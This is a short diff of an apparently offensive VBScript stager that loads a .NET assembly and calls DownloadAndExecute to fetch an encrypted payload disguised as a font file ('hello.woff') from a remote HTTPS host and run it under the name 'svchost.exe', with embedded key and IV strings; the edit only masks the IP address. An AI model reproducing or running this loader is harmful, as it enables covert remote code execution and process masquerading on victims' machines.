@@ -127,7 +127,7 @@ Function Run()
     al.Add Empty
 
     Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
-    o.DownloadAndExecute "https://192.168.8.205:8443/hello.woff", "svchost.exe", "", "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT", "8y/B?E(G+KbPeShV"
+    o.DownloadAndExecute "https://192.168.X.X:8443/hello.woff", "svchost.exe", "", "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT", "8y/B?E(G+KbPeShV"
     
     If Err.Number <> 0 Then
       DebugPrint Err.Description
